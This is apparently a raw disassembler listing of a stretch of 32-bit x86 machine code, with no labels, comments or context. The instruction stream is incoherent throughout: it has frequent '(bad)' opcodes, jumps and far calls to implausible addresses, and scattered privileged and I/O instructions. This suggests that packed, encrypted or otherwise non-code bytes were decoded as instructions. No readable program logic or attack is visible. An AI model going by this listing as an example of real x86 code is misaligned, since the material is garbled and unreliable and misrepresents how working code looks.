  41770a:	imul   edx,DWORD PTR [esi-0x715c628],0xffffff9d
  417711:	aad    0xa4
  417713:	rcl    BYTE PTR [edi],0xf8
  417716:	push   cs
  417717:	mov    ah,0xc
  417719:	jbe    0x41777d
  41771b:	pop    ss
  41771c:	test   al,0xa3
  41771e:	jmp    0x7938d2d
  417723:	int    0xb1
  417725:	(bad)  [eax-0x1e]
  417728:	jmp    0x417733
  41772a:	push   esp
  41772b:	popa   
  41772c:	sub    BYTE PTR [edi-0x2fce060b],dh
  417732:	ds adc al,0x11
  417735:	push   esp
  417736:	sub    BYTE PTR [esi+ecx*1-0x15],dh
  41773a:	jle    0x4176e5
  41773c:	dec    esi
  41773d:	ret    0xb261
  417740:	retf   
  417741:	outs   dx,BYTE PTR ds:[esi]
  417742:	js     0x417786
  417744:	jl     0x41774b
  417746:	xchg   edi,eax
  417747:	imul   edi,DWORD PTR [ebp+eiz*8-0x10],0x50
  41774c:	scas   eax,DWORD PTR es:[edi]
  41774d:	loope  0x41775a
  41774f:	pop    edx
  417750:	outs   dx,DWORD PTR ds:[esi]
  417751:	sub    eax,0x25d712da
  417756:	dec    ebx
  417757:	xchg   edi,eax
  417758:	imul   DWORD PTR [ecx-0x63]
  41775b:	cli    
  41775c:	xchg   esp,eax
  41775d:	imul   ecx,DWORD PTR [esi],0xea785d8
  417763:	fnstsw WORD PTR [ebx-0x180986fe]
  417769:	mov    ds:0x77fcebd6,al
  41776e:	hlt    
  41776f:	fcmovnbe st,st(2)
  417771:	xor    bh,BYTE PTR [edx]
  417773:	lahf   
  417774:	ja     0x41774c
  417776:	scas   al,BYTE PTR es:[edi]
  417777:	sub    bh,bl
  417779:	mov    al,ds:0x3c830d24
  41777e:	mov    cl,0x7
  417780:	jecxz  0x41779d
  417782:	xlat   BYTE PTR ds:[ebx]
  417783:	jnp    0x417746
  417785:	mov    BYTE PTR [esi+edi*4+0x11c8a8cd],ch
  41778c:	or     DWORD PTR [eax],ecx
  41778e:	inc    ebp
  41778f:	repnz mov al,0x0
	...
  4177f2:	add    BYTE PTR [eax],al
  4177f4:	jmp    0xff597607
  4177f9:	imul   ecx
  4177fb:	(bad)  
  4177fc:	lahf   
  4177fd:	repnz and dl,dl
  417800:	test   al,0xb5
  417802:	mov    ch,0x62
  417804:	call   0x1:0x50000f8
  41780b:	add    BYTE PTR [ebp-0x7d2941d6],cl
  417811:	leave  
  417812:	daa    
  417813:	fild   WORD PTR [ecx-0x46]
  417816:	fst    QWORD PTR [ebx+ecx*8-0x21]
  41781a:	mov    ecx,0xc8431b66
  41781f:	mov    BYTE PTR [edx+edx*4+0x7b1ac09f],dl
  417826:	ror    BYTE PTR [edx*8-0x2da666c4],cl
  41782d:	mov    ch,0xb1
  41782f:	in     al,0x2e
  417831:	stc    
  417832:	xchg   edx,eax
  417833:	imul   esi,DWORD PTR [ecx+0x27],0x50
  417837:	and    dl,BYTE PTR [ebx+0x307c567b]
  41783d:	fisttp DWORD PTR [edi-0x11afb1ae]
  417843:	mov    esp,0xfbb535ac
  417848:	fimul  DWORD PTR ds:0x2afa6c77
  41784e:	and    al,0x62
  417850:	mov    edx,fs
  417852:	push   ebx
  417853:	data16 mov ch,0x88
  417856:	add    DWORD PTR [ebx-0x65],0x61e4175f
  41785d:	les    ebp,FWORD PTR [edx+0x4e]
  417860:	je     0x41785b
  417862:	js     0x417828
  417864:	fisub  WORD PTR [edx+esi*1+0x16]
  417868:	test   BYTE PTR [edx],bh
  41786a:	leave  
  41786b:	inc    esp
  41786c:	push   es
  41786d:	cmp    eax,0x9c727607
  417872:	stos   BYTE PTR es:[edi],al
  417873:	mov    ds:0x8e172204,eax
  417878:	lock jmp 0x59ab:0xafb644ba
  417880:	and    al,bl
  417882:	idiv   DWORD PTR [esi-0x44]
  417885:	xor    eax,eax
  417887:	xor    BYTE PTR [esi],ch
  417889:	imul   edx,DWORD PTR [esi-0x3776cb43],0x89b516b5
  417893:	mov    al,ds:0xf7885bf2
  417898:	in     eax,dx
  417899:	jle    0x4178a7
  41789b:	retf   0xd76f
  41789e:	mov    bl,0x96
  4178a0:	into   
  4178a1:	mov    ebp,0x6020fa03
  4178a6:	mov    cl,BYTE PTR [edi]
  4178a8:	sub    al,0xd5
  4178aa:	test   DWORD PTR [ebx+eiz*2],esp
  4178ad:	call   0x9832:0xe622aa4e
  4178b4:	clc    
  4178b5:	jmp    0x71fd2dbe
  4178ba:	in     eax,dx
  4178bb:	xor    cl,BYTE PTR [edi]
  4178bd:	inc    eax
  4178be:	mov    BYTE PTR [ebx-0x75],al
  4178c1:	not    BYTE PTR ds:0xc1b593e0
  4178c7:	jmp    0x4a1b:0x4767a25a
  4178ce:	jmp    0x8731aaad
  4178d3:	cmp    DWORD PTR [ecx-0x43],ebx
  4178d6:	adc    ah,ch
  4178d8:	repnz cmp dh,BYTE PTR [ecx+0x26]
  4178dc:	jg     0x41786a
  4178de:	lock test DWORD PTR [edi],esi
  4178e1:	outs   dx,DWORD PTR ds:[esi]
  4178e2:	adc    eax,DWORD PTR [edi]
  4178e4:	es leave 
  4178e6:	cmp    eax,0xe7157fed
  4178eb:	fs neg bl
  4178ee:	fld    TBYTE PTR [ecx-0x12]
  4178f1:	xor    dh,BYTE PTR [ecx]
  4178f3:	je     0x4178e5
  4178f5:	aas    
  4178f6:	xchg   edx,eax
  4178f7:	popa   
  4178f8:	and    bh,BYTE PTR [edx+0x3369b46b]
  4178fe:	add    ebp,ebx
  417900:	adc    BYTE PTR [ebp-0x2f],0xc0
  417904:	call   0x5734b333
  417909:	fwait
  41790a:	mov    edi,0xf400ef8e
  41790f:	lea    esi,[eax+eax*1]
	...
  417972:	add    BYTE PTR [eax],al
  417974:	pop    eax
  417975:	inc    ecx
  417976:	pop    ds
  417977:	lods   eax,DWORD PTR ds:[esi]
  417978:	pop    ds
  417979:	(bad)  
  41797a:	cli    
  41797b:	cmc    
  41797c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41797d:	retf   0xe5d4
  417980:	inc    esp
  417981:	test   DWORD PTR [eax],ebp
  417983:	int    0x9f
  417985:	stc    
  417986:	add    BYTE PTR [eax],al
  417988:	add    eax,0x15000001
  41798d:	mov    eax,0xfb00ad5e
  417992:	sbb    DWORD PTR ss:[ebx-0x7d2e30a2],edi
  417999:	fisubr WORD PTR [ecx+0x697c1deb]
  41799f:	mov    bh,0xe6
  4179a1:	loope  0x4179be
  4179a3:	mov    ah,0x84
  4179a5:	jns    0x417a1b
  4179a7:	jae    0x417a05
  4179a9:	or     eax,0x43360f0c
  4179ae:	(bad)  
  4179af:	fucomp st(7)
  4179b1:	mov    dh,0xc9
  4179b3:	mov    cl,0xc0
  4179b5:	sbb    ebp,DWORD PTR [ebp-0x3d]
  4179b8:	add    eax,0xccf389d1
  4179bd:	cmp    BYTE PTR [edx-0x14e73045],ch
  4179c3:	xor    ecx,esi
  4179c5:	ror    dl,cl
  4179c7:	icebp  
  4179c8:	mov    ds:0x2f8d2f81,eax
  4179cd:	sbb    al,0xfb
  4179cf:	add    BYTE PTR ds:0xa9324c6a,ch
  4179d5:	inc    esi
  4179d6:	mov    dl,0x1
  4179d8:	and    al,0x3
  4179da:	add    eax,ebp
  4179dc:	dec    esi
  4179dd:	add    bh,BYTE PTR [ebp-0x50]
  4179e0:	or     ah,BYTE PTR [ecx-0x46]
  4179e3:	sub    ebx,edi
  4179e5:	enter  0x39de,0xf5
  4179e9:	repnz mov ah,bh
  4179ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4179ed:	arpl   WORD PTR [eax+0xa252645],si
  4179f3:	fmul   QWORD PTR [ecx-0x24db0139]
  4179f9:	or     eax,DWORD PTR [esi+0x24]
  4179fc:	jnp    0x4179dc
  4179fe:	inc    esi
  4179ff:	shl    BYTE PTR [edi-0x488b5ac4],0x18
  417a06:	push   esi
  417a07:	adc    al,0x37
  417a09:	push   0x591c4ae1
  417a0e:	imul   edx,DWORD PTR [ebp-0x35],0x9b55f0fa
  417a15:	rcr    BYTE PTR [ecx-0x11],cl
  417a18:	adc    al,0x8a
  417a1a:	shl    ch,0x1e
  417a1d:	mov    esi,gs
  417a1f:	js     0x4179b6
  417a21:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417a22:	fbld   TBYTE PTR [edx+0x44]
  417a25:	loop   0x4179c1
  417a27:	dec    ebx
  417a28:	aam    0x1c
  417a2a:	rcl    DWORD PTR [edx-0x2],0xe7
  417a2e:	jnp    0x4179d4
  417a30:	bound  ecx,QWORD PTR [ecx-0x196b8573]
  417a36:	fs push ds
  417a38:	dec    eax
  417a39:	jno    0x4179f8
  417a3b:	xchg   esi,eax
  417a3c:	xor    BYTE PTR [ebx+0x3c],dh
  417a3f:	shl    esp,1
  417a41:	xor    bl,BYTE PTR [ebp-0x2d379599]
  417a47:	cmp    ebx,DWORD PTR [ecx]
  417a49:	lods   eax,DWORD PTR ds:[esi]
  417a4a:	cdq    
  417a4b:	push   edx
  417a4c:	inc    edx
  417a4d:	mov    ebp,ebx
  417a4f:	mov    cs,WORD PTR [edi+0x7e]
  417a52:	mov    esp,0xc3ae83bb
  417a57:	mov    ch,BYTE PTR [ecx-0x2d]
  417a5a:	call   0x6c31a411
  417a5f:	nop
  417a60:	inc    ebp
  417a61:	jmp    0x6574b684
  417a66:	shl    DWORD PTR [ebx],1
  417a68:	or     bh,BYTE PTR [edi-0x4bdca5a6]
  417a6e:	sbb    esi,DWORD PTR [esi+0x35]
  417a71:	mov    al,al
  417a73:	adc    esp,edx
  417a75:	bsf    eax,DWORD PTR [edx+ebx*1+0x23]
  417a7a:	cwde   
  417a7b:	test   al,0x7d
  417a7d:	jp     0x417a99
  417a7f:	sti    
  417a80:	test   eax,0x9f560d06
  417a85:	dec    edx
  417a86:	mov    es,WORD PTR ds:0xfa3dedc0
  417a8c:	ss mov ah,0xb9
  417a8f:	lods   eax,DWORD PTR ds:[esi]
  417a90:	out    dx,al
	...
  417af1:	add    BYTE PTR [eax],al
  417af3:	add    BYTE PTR [edi],ch
  417af5:	stos   DWORD PTR es:[edi],eax
  417af6:	cdq    
  417af7:	inc    ecx
  417af8:	popf   
  417af9:	jae    0x417afa
  417afb:	out    dx,eax
  417afc:	(bad)  [eax]
  417afe:	xor    ebx,DWORD PTR [ecx-0x39b85d96]
  417b04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417b05:	cli    
  417b06:	add    BYTE PTR [eax],al
  417b08:	add    eax,0xd1000001
  417b0d:	(bad)  
  417b0e:	cmp    al,0x90
  417b10:	mov    ah,0x95
  417b12:	imul   esi,DWORD PTR [ebx-0x2d1f066b],0x54
  417b19:	sub    ebx,ebp
  417b1b:	out    dx,al
  417b1c:	pop    ss
  417b1d:	clc    
  417b1e:	jecxz  0x417b8a
  417b20:	xchg   ebp,eax
  417b21:	out    dx,eax
  417b22:	mov    ds,WORD PTR [ebx-0x80]
  417b25:	outs   dx,BYTE PTR ds:[esi]
  417b26:	jmp    0x499:0x55d66249
  417b2d:	sar    DWORD PTR [eax+0x3ab6affb],0x15
  417b34:	fld    QWORD PTR [ecx-0x508680d9]
  417b3a:	loope  0x417b1c
  417b3c:	xor    DWORD PTR [ecx+edx*4+0x1fdef0bd],esi
  417b43:	add    edi,edx
  417b45:	and    eax,0xf88571b0
  417b4a:	retf   
  417b4b:	inc    edi
  417b4c:	test   BYTE PTR [eax-0x4be6baae],0xa9
  417b53:	mov    eax,0x6d064b35
  417b58:	push   0xffffff83
  417b5a:	lahf   
  417b5b:	mov    dh,0x7e
  417b5d:	sub    eax,0x83db0845
  417b62:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417b63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417b64:	dec    edx
  417b65:	or     eax,0x42d99b0a
  417b6a:	dec    ebp
  417b6b:	fwait
  417b6c:	jge    0x417bb5
  417b6e:	jnp    0x417b23
  417b70:	xchg   esi,eax
  417b71:	psllw  mm7,QWORD PTR [ebx+0x2b]
  417b75:	jmp    0x417bc0
  417b77:	cmp    al,0xd9
  417b79:	sbb    bh,BYTE PTR [eax-0x5a6ae5ce]
  417b7f:	push   ds
  417b80:	cwde   
  417b81:	(bad)  
  417b83:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417b84:	mov    ah,0x7b
  417b86:	leave  
  417b87:	inc    edi
  417b88:	jmp    0x24e2:0x2ea4fb24
  417b8f:	aas    
  417b90:	inc    esi
  417b91:	mov    BYTE PTR [esi],0xc2
  417b94:	sub    BYTE PTR [ebx-0x67e7530c],0x9f
  417b9b:	test   DWORD PTR ds:0xe1273a75,ebp
  417ba1:	adc    eax,0xdb45ba21
  417ba6:	and    BYTE PTR [edx-0x798f5b87],0xf9
  417bad:	and    al,0xd2
  417baf:	jecxz  0x417be6
  417bb1:	push   cs
  417bb2:	retf   0xbdb
  417bb5:	sub    eax,0x1d95246b
  417bba:	stos   DWORD PTR es:[edi],eax
  417bbb:	add    eax,0x37
  417bbe:	pop    ecx
  417bbf:	xchg   edi,eax
  417bc0:	mov    bh,0x19
  417bc2:	push   esp
  417bc3:	jno    0x417b73
  417bc5:	cmp    ebp,ebx
  417bc7:	xor    BYTE PTR [esi],dl
  417bc9:	mov    edx,0x8071ba4c
  417bce:	test   eax,0xd26c3513
  417bd3:	mul    ch
  417bd5:	leave  
  417bd6:	pop    edi
  417bd7:	jge    0x417c09
  417bd9:	in     al,0xaf
  417bdb:	jmp    0x417c0c
  417bdd:	push   es
  417bde:	xor    al,0x86
  417be0:	arpl   WORD PTR [ebp-0x4ae014aa],bp
  417be6:	add    bl,al
  417be8:	inc    edx
  417be9:	add    eax,0xfd73a26
  417bee:	dec    ebx
  417bef:	ret    0xd902
  417bf2:	and    BYTE PTR [esi-0x211f27cf],cl
  417bf8:	outs   dx,DWORD PTR ds:[esi]
  417bf9:	in     al,dx
  417bfa:	stos   DWORD PTR es:[edi],eax
  417bfb:	or     BYTE PTR [edi+0x11],al
  417bfe:	add    al,0xa4
  417c00:	pop    ecx
  417c01:	icebp  
  417c02:	mov    cl,0x7a
  417c04:	repnz xor al,BYTE PTR [edx-0x4bd65eb5]
  417c0b:	lahf   
  417c0c:	inc    ebp
  417c0d:	ja     0x417c37
  417c0f:	xchg   edx,eax
  417c10:	out    dx,al
	...
  417c71:	add    BYTE PTR [eax],al
  417c73:	add    BYTE PTR [ecx-0x267b6f40],cl
  417c79:	aam    0x9d
  417c7b:	int    0x75
  417c7d:	aaa    
  417c7e:	das    
  417c7f:	aam    0x81
  417c81:	fwait
  417c82:	push   ebx
  417c83:	ja     0x417c2e
  417c85:	sti    
  417c86:	add    BYTE PTR [eax],al
  417c88:	add    eax,0x9d000001
  417c8d:	loope  0x417c10
  417c8f:	test   DWORD PTR [ecx+ebx*1+0x60],ecx
  417c93:	ror    esp,0x72
  417c96:	int    0xbe
  417c98:	sub    ah,BYTE PTR [esi+0x4b]
  417c9b:	in     eax,0x2d
  417c9d:	push   ebx
  417c9e:	fs aas 
  417ca0:	icebp  
  417ca1:	xor    DWORD PTR [edi+0x35],0xdec350f7
  417ca8:	je     0x417d22
  417caa:	adc    al,0x9a
  417cac:	repz add ecx,DWORD PTR [edi-0xd]
  417cb0:	leave  
  417cb1:	iret   
  417cb2:	mov    ebx,0x257ab502
  417cb7:	adc    ebx,ecx
  417cb9:	sti    
  417cba:	add    eax,0x9b64f7d2
  417cbf:	das    
  417cc0:	fwait
  417cc1:	test   BYTE PTR [ebp-0x6e],ah
  417cc4:	addr16 push ss
  417cc6:	sub    DWORD PTR [edi-0x8],ebx
  417cc9:	pop    DWORD PTR [ebx+eiz*4+0x33ca7ab8]
  417cd0:	out    0xd1,eax
  417cd2:	mov    ds:0xb26b948d,al
  417cd7:	sbb    al,0x2e
  417cd9:	cli    
  417cda:	jge    0x417d2d
  417cdc:	jg     0x417ce0
  417cde:	cmp    al,0x53
  417ce0:	repz cdq 
  417ce2:	neg    BYTE PTR [eax+0x62]
  417ce5:	inc    esi
  417ce6:	dec    esi
  417ce7:	mov    BYTE PTR [edx],dl
  417ce9:	inc    ecx
  417cea:	jnp    0x417c9d
  417cec:	sub    BYTE PTR [ecx],0xdd
  417cef:	pop    edx
  417cf0:	ins    DWORD PTR es:[edi],dx
  417cf1:	mov    ebp,0x94a5cc8f
  417cf6:	outs   dx,BYTE PTR ds:[esi]
  417cf7:	xlat   BYTE PTR ds:[ebx]
  417cf8:	jl     0x417d4a
  417cfa:	into   
  417cfb:	mov    ah,0xb3
  417cfd:	inc    edi
  417cfe:	jo     0x417d16
  417d00:	pop    ebp
  417d01:	dec    eax
  417d02:	mov    ds:0x6f5a9476,al
  417d07:	mov    ch,0x97
  417d09:	outs   dx,BYTE PTR ds:[esi]
  417d0a:	jp     0x417cbb
  417d0c:	add    ch,BYTE PTR [esi-0x4b31a467]
  417d12:	imul   esi,DWORD PTR [ecx],0x4c
  417d15:	cld    
  417d16:	or     esi,DWORD PTR [edi]
  417d18:	lock and al,BYTE PTR [edx-0x15]
  417d1c:	pop    edi
  417d1d:	rcr    DWORD PTR [ebx],1
  417d1f:	test   al,0x6c
  417d21:	lock and BYTE PTR [esi],al
  417d24:	push   ebp
  417d25:	dec    edx
  417d26:	push   0xffffffe3
  417d28:	cld    
  417d29:	inc    ebx
  417d2a:	cli    
  417d2b:	xchg   edi,eax
  417d2c:	adc    ah,dh
  417d2e:	les    ecx,FWORD PTR [edi+0x14]
  417d31:	cmc    
  417d32:	sub    eax,0x78531f67
  417d37:	arpl   WORD PTR [edx],bp
  417d39:	dec    esi
  417d3a:	jle    0x417d4b
  417d3c:	mov    dh,0x5b
  417d3e:	stc    
  417d3f:	out    0xc8,eax
  417d41:	cmp    ebp,edx
  417d43:	adc    esp,DWORD PTR [edi-0x6239b0cf]
  417d49:	loope  0x417ce0
  417d4b:	xchg   edi,eax
  417d4c:	jle    0x417d25
  417d4e:	and    al,cl
  417d50:	mul    DWORD PTR [edx-0x490c8c6e]
  417d56:	fstp   TBYTE PTR [edx]
  417d58:	jp     0x417d36
  417d5a:	xchg   bl,ch
  417d5c:	iret   
  417d5d:	adc    al,0x53
  417d5f:	or     DWORD PTR [esi+ebx*8],eax
  417d62:	ret    
  417d63:	cmp    bl,BYTE PTR [edx-0x4a]
  417d66:	rcr    DWORD PTR [edi+0x3f517908],0x47
  417d6d:	jnp    0x417cf9
  417d6f:	xchg   edi,eax
  417d70:	push   eax
  417d71:	int    0xc1
  417d73:	mov    ch,BYTE PTR [ebp+0x210fa778]
  417d79:	mov    dl,0xd
  417d7b:	xor    DWORD PTR [edi],ecx
  417d7d:	clc    
  417d7e:	or     cl,dl
  417d80:	sub    eax,0xe4dbfa82
  417d85:	and    BYTE PTR [edx+0x7e6a8b56],dl
  417d8b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417d8c:	les    ebx,FWORD PTR [edi+0x3b]
  417d8f:	jecxz  0x417d61
	...
  417df1:	add    BYTE PTR [eax],al
  417df3:	add    BYTE PTR [edi],dl
  417df5:	arpl   WORD PTR ds:0x5f7f7d53,bx
  417dfb:	addr16 dec esi
  417dfd:	sub    BYTE PTR [ecx+0x46],ch
  417e00:	scas   al,BYTE PTR es:[edi]
  417e01:	jmp    0x0:0xfcaebed5
  417e08:	add    eax,0x5b000001
  417e0d:	dec    ebp
  417e0e:	adc    al,BYTE PTR [edx+0x63]
  417e11:	ds cmp bh,bl
  417e14:	inc    edx
  417e15:	lock and eax,0xc5e0608b
  417e1b:	out    dx,al
  417e1c:	(bad)  
  417e1d:	ins    DWORD PTR es:[edi],dx
  417e1e:	(bad)  
  417e1f:	in     al,dx
  417e20:	sbb    al,0x6a
  417e22:	stos   DWORD PTR es:[edi],eax
  417e23:	and    bh,bh
  417e25:	adc    ah,BYTE PTR [ecx]
  417e27:	ds mov dl,0xcf
  417e2a:	jmp    0x4d8e05af
  417e2f:	leave  
  417e30:	(bad)  
  417e31:	pop    esp
  417e32:	outs   dx,BYTE PTR ds:[esi]
  417e33:	add    DWORD PTR [ecx+0x41],0x822ecca
  417e3a:	test   BYTE PTR [esp+eiz*4],bh
  417e3d:	xchg   ecx,eax
  417e3e:	sub    eax,0xedfc8984
  417e43:	ins    DWORD PTR es:[edi],dx
  417e44:	mov    ecx,0x708b8a94
  417e49:	icebp  
  417e4a:	xchg   esi,eax
  417e4b:	mov    dl,0xcf
  417e4d:	fsub   QWORD PTR [esi]
  417e4f:	mov    WORD PTR [eax-0x5e],ds
  417e52:	neg    DWORD PTR [edi]
  417e54:	mov    ss,WORD PTR [eax]
  417e56:	cmp    cl,BYTE PTR [edx]
  417e58:	mov    eax,ds:0x620f21f7
  417e5d:	scas   al,BYTE PTR es:[edi]
  417e5e:	pop    ebp
  417e5f:	loop   0x417ec4
  417e61:	sub    dh,BYTE PTR [edi+0x7ec22a33]
  417e67:	or     BYTE PTR [edx+edi*4+0x6f03dbb0],ah
  417e6e:	adc    bl,bh
  417e70:	xor    esi,DWORD PTR [ecx+0x9205f3d]
  417e76:	and    dh,dl
  417e78:	xor    BYTE PTR [eax],bl
  417e7a:	mov    ah,0x90
  417e7c:	mov    bh,0xf1
  417e7e:	push   ebp
  417e7f:	inc    esp
  417e80:	mov    esi,eax
  417e82:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  417e84:	nop
  417e85:	sbb    eax,0x8554c2e8
  417e8a:	xchg   edx,eax
  417e8b:	ja     0x417e1d
  417e8d:	repnz (bad) 
  417e8f:	xchg   ebx,eax
  417e90:	inc    ebx
  417e91:	xor    DWORD PTR [eax+ebx*4],edi
  417e94:	cld    
  417e95:	stos   BYTE PTR es:[edi],al
  417e96:	arpl   WORD PTR [eax],ax
  417e98:	inc    edi
  417e99:	mov    dh,0xab
  417e9b:	(bad)  
  417e9c:	in     al,dx
  417e9d:	test   DWORD PTR [edi],eax
  417e9f:	push   edi
  417ea0:	or     eax,0x9efd6bc4
  417ea5:	sub    eax,0xa0d5ac62
  417eaa:	sub    dh,BYTE PTR [eax+ecx*4]
  417ead:	sbb    DWORD PTR [ebx+eax*8],esp
  417eb0:	inc    ecx
  417eb1:	shr    BYTE PTR [edx+0x27],cl
  417eb4:	xor    eax,0x7aab04f8
  417eb9:	push   0x78bccd66
  417ebe:	and    BYTE PTR [eax],ch
  417ec0:	daa    
  417ec1:	lea    ebx,[ebx+0x47]
  417ec4:	cmp    DWORD PTR [esi],eax
  417ec6:	test   BYTE PTR [edx],ah
  417ec8:	into   
  417ec9:	sub    ebx,DWORD PTR [ebp+eiz*4+0x10]
  417ecd:	cmp    ecx,esp
  417ecf:	sbb    edx,edi
  417ed1:	push   0x52
  417ed3:	pusha  
  417ed4:	call   0x8cb018a2
  417ed9:	and    eax,0xd7c38e65
  417ede:	push   es
  417edf:	and    DWORD PTR ds:0xd3e1781b,edi
  417ee5:	adc    ah,ch
  417ee7:	test   eax,0xf4814232
  417eec:	ins    BYTE PTR es:[edi],dx
  417eed:	push   0x36
  417eef:	sub    dh,ah
  417ef1:	inc    edx
  417ef2:	mov    ah,0x96
  417ef4:	ret    
  417ef5:	mov    WORD PTR [edx+0x43],?
  417ef8:	jl     0x417eac
  417efa:	dec    edi
  417efb:	push   es
  417efc:	mov    bl,0x1b
  417efe:	cld    
  417eff:	(bad)  
  417f00:	jno    0x417ea3
  417f02:	mov    ds:0xcee3715d,al
  417f07:	mov    ebx,0xaf5a2142
  417f0c:	mov    cs,WORD PTR [ebp+0x64c111]
	...
  417f72:	add    BYTE PTR [eax],al
  417f74:	(bad)  
  417f75:	out    0xe6,al
  417f77:	cmp    esp,esi
  417f79:	cmp    edi,edi
  417f7b:	push   DWORD PTR [edx]
  417f7d:	xchg   edx,eax
  417f7e:	xor    al,bh
  417f80:	and    al,0xb5
  417f82:	lahf   
  417f83:	out    0xb3,eax
  417f85:	std    
  417f86:	add    BYTE PTR [eax],al
  417f88:	add    eax,0x38000001
  417f8d:	out    dx,al
  417f8e:	ss push ds
  417f90:	cmp    DWORD PTR [edi-0x1d7b4bd8],ecx
  417f96:	jle    0x417f5b
  417f98:	or     BYTE PTR [eax+eiz*8],0x1b
  417f9c:	push   edx
  417f9d:	inc    esp
  417f9e:	dec    ebp
  417f9f:	jno    0x417f40
  417fa1:	rcl    DWORD PTR [ebx+eax*8+0x25],cl
  417fa5:	out    0x22,al
  417fa7:	into   
  417fa8:	scas   al,BYTE PTR es:[edi]
  417fa9:	pop    ecx
  417faa:	test   DWORD PTR [esi-0x65058315],ecx
  417fb0:	mov    ecx,0x1caadae7
  417fb5:	fincstp 
  417fb7:	mov    ebx,0x7134ce39
  417fbc:	ret    
  417fbd:	sub    esp,esi
  417fbf:	and    BYTE PTR [edx-0x7770d0a4],dl
  417fc5:	xchg   esp,eax
  417fc6:	xchg   edx,eax
  417fc7:	mov    eax,ds:0x614b6721
  417fcc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417fcd:	pop    ebp
  417fce:	fs sti 
  417fd0:	cmp    esp,DWORD PTR [esi-0x293f4d8e]
  417fd6:	mov    cl,bl
  417fd8:	nop
  417fd9:	aaa    
  417fda:	(bad)  
  417fdb:	cmp    DWORD PTR ds:0x88c3bb59,eax
  417fe1:	inc    esi
  417fe2:	jp     0x418012
  417fe4:	inc    eax
  417fe5:	mov    edi,0x35bb3e04
  417fea:	cmp    cl,al
  417fec:	lahf   
  417fed:	fmul   DWORD PTR [esp+ebp*8+0x335d1a1d]
  417ff4:	mov    al,ds:0x3771356f
  417ff9:	mov    esi,0x4fbb3daf
  417ffe:	cmp    eax,0xcf94f16d
  418003:	sar    BYTE PTR [ecx-0x3f],0x84
  418007:	rcr    esi,0x20
  41800a:	int    0x21
  41800c:	mov    ds,WORD PTR [ecx-0x3d73eaf8]
  418012:	xchg   edx,eax
  418013:	fmul   QWORD PTR [esi]
  418015:	or     BYTE PTR [edx],bh
  418017:	iret   
  418018:	aam    0xfd
  41801a:	stos   DWORD PTR es:[edi],eax
  41801b:	sbb    bh,BYTE PTR [eax+0xe]
  41801e:	icebp  
  41801f:	jae    0x418098
  418021:	push   ds
  418022:	xchg   ebx,eax
  418023:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418024:	loopne 0x418041
  418026:	mov    esp,DWORD PTR [ebp-0x23]
  418029:	inc    edx
  41802a:	ins    DWORD PTR es:[edi],dx
  41802b:	mov    ch,ch
  41802d:	fwait
  41802e:	test   BYTE PTR [edx-0x67f14fe9],ch
  418034:	out    0x97,eax
  418036:	arpl   si,di
  418038:	sub    DWORD PTR [eax],ebp
  41803a:	(bad)  
  41803b:	push   ebp
  41803c:	sub    ebx,0x6c2cc387
  418042:	sub    al,0xa7
  418044:	call   0x7634:0x5bf6830a
  41804b:	in     al,0x3d
  41804d:	setns  BYTE PTR [eax-0x9]
  418051:	mov    bh,0x80
  418053:	xchg   ebp,eax
  418054:	adc    edi,DWORD PTR [edi]
  418056:	jno    0x418064
  418058:	jg     0x418065
  41805a:	cli    
  41805b:	retf   0x21fa
  41805e:	xchg   ecx,eax
  41805f:	jmp    0xdfb646dd
  418064:	(bad)  
  418065:	mov    ebp,0x9c41d175
  41806a:	scas   al,BYTE PTR es:[edi]
  41806b:	cmp    edi,DWORD PTR [edx]
  41806d:	repz push cs
  41806f:	(bad)  [edx-0x578047ac]
  418075:	aad    0xef
  418077:	sub    BYTE PTR [ebx],bl
  418079:	fwait
  41807a:	mov    cl,0x4c
  41807c:	mov    cl,0x77
  41807e:	sub    BYTE PTR [eax+0x44],0xa7
  418082:	lahf   
  418083:	adc    ebp,0x8
  418086:	sbb    al,0xe
  418088:	mov    edx,0x8b089d0a
  41808d:	pop    DWORD PTR [eax+0x58e9]
	...
  4180f3:	add    BYTE PTR [ecx-0xba9482],ch
  4180f9:	push   ebp
  4180fa:	scas   eax,DWORD PTR es:[edi]
  4180fb:	(bad)  
  4180fc:	mov    ds:0xe2fdebc,eax
  418101:	cli    
  418102:	inc    DWORD PTR [eax+0xfeb8]
  418108:	add    eax,0x83000001
  41810d:	in     al,dx
  41810e:	mov    al,ds:0xe0206e07
  418113:	clc    
  418114:	pop    edx
  418115:	ret    
  418116:	mov    ch,0x16
  418118:	xor    al,0x6
  41811a:	cmc    
  41811b:	fdiv   st(1),st
  41811d:	fwait
  41811e:	sti    
  41811f:	pop    ss
  418120:	mov    ah,0x32
  418122:	inc    edi
  418123:	mov    al,ds:0x892a336b
  418128:	es pop esi
  41812a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41812b:	adc    BYTE PTR [eax-0xc],0xaa
  41812f:	sbb    al,0x29
  418131:	dec    eax
  418132:	or     ebx,ebp
  418134:	add    ah,BYTE PTR [ecx]
  418136:	in     eax,dx
  418137:	in     al,dx
  418138:	inc    eax
  418139:	cmp    BYTE PTR [edi-0x10],al
  41813c:	and    DWORD PTR [ecx-0x80],esi
  41813f:	jge    0x41819f
  418141:	sti    
  418142:	xchg   ecx,eax
  418143:	pop    eax
  418144:	push   esi
  418145:	sar    esp,1
  418147:	sar    DWORD PTR [eax-0x4d],1
  41814a:	mov    ecx,DWORD PTR [esi-0x69]
  41814d:	xchg   esp,eax
  41814e:	pop    ss
  41814f:	pop    edx
  418150:	enter  0x4116,0xe1
  418154:	add    bh,BYTE PTR [ebx-0x1ac5585b]
  41815a:	lods   al,BYTE PTR ds:[esi]
  41815b:	mov    esp,0x81f3ea2e
  418160:	js     0x41812d
  418162:	les    esi,FWORD PTR [ebp-0x4728c6e5]
  418168:	outs   dx,BYTE PTR ds:[esi]
  418169:	and    ecx,DWORD PTR [ecx+0x12]
  41816c:	mov    BYTE PTR [edx+edx*2],0xc4
